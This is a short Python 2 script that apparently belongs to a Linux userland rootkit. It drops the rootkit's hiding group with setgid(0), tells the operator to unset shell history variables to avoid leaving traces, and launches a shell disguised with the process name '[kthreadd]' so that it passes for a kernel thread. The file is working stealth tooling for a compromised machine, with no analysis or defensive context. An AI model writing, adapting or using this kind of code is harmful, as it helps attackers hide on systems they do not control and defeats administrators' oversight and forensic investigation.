#!/usr/bin/env python
from ctypes import *
from os import execv
libc = cdll.LoadLibrary("libc.so.6") 
libc.setgid(0)
print 'Any processes you spawn from the shell you are about to launch will be visible. Do not start daemons this way.'
print 'Do what you have to do and leave this shell immediately.\nThe first thing you type should be "unset HISTORY HISTFILE HISTSIZE PROMPT_COMMAND".\nThe third or fourth thing you type should probably be "exit".'
print 'READ THIS CAREFULLY AND TYPE "YES I HAVE READ THE WARNING. I KNOW WHAT I AM ABOUT TO DO."'
print 'If you do not do this, you will not be unhidden.'
if raw_input("Have you read the warning? ") == "YES I HAVE READ THE WARNING. I KNOW WHAT I AM ABOUT TO DO.": 
  print 'You are now visible, and it is now safe to use package management utilities.'
  print 'Your process name is now [kthreadd]. Be EXTREMELY careful in this state.'
  execv('/bin/sh',('[kthreadd]',))
else: print 'Then what the fuck are you doing unhiding yourself?'
